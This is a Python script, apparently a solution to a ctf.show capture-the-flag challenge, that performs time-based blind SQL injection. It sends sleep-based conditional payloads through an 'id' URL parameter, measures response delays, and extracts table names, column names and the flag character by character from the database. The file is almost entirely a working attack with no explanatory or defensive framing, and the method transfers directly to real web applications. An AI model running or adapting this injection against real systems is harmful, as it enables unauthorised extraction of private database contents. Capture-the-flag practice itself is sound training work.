import requests,json,datetime
url='http://9143ba0d-76e9-4789-b9fb-8c05b0062b25.chall.ctf.show/api/?id='
def chk(pl):
    data = {
        'id':"1 or if(({}),sleep(0.1),false)".format(pl),
        'debug':'1'
    }
   # print(data['ip'])
    start =datetime.datetime.now()
    requests.get(url=url+"1' and if(({}),sleep(2),false)-- -".format(pl),timeout=10)
    end=datetime.datetime.now()-start
    return end.seconds>=2
Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
table=''

def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where table_schema=database()',ret='',l=1):

    while True:
        print(l,end=',')
        pl_gcd='select + length('+pl+')=%d '%l + plf
        if chk(pl_gcd) : break
        l+=1
    print('\n'+'- '*20)
    print('len=', l)
    print('- ' * 20)

    for i in range (len(ret)+1,1+l):
        print('\n',format(ret,'%ds'%(l+2))+"|%02d| "%i,end='')
        for j in Alphabet:
            pl_gnr="select mid({},{},1)='{}' {}".format(pl,i,j,plf)
            print(j,end='')
            if(chk(pl_gnr)):
                ret+=j
                break
    print('\n'+'- '*20)
    print('ret=', ret)
    print('- ' * 20)
    return ret


print(chk('select(1=1)'),chk('select(1>1)'))
url='http://9143ba0d-76e9-4789-b9fb-8c05b0062b25.chall.ctf.show/api/?id='
#bi(pl='group_concat(table_name)',plf=' from information_schema.tables where table_schema=database() and table_name like \'%flag%\'')#爆表
#bi('(group_concat(column_name))'," from(information_schema.columns)where(table_name = 'ctfshow_flagsa' and column_name like '%flag%')",'') # 爆字段
Alphabet='0123456789-abcdef{}gl'
bi('group_concat(`flag?`)',' from ctfshow_flagsa','flag{',41) #爆flag
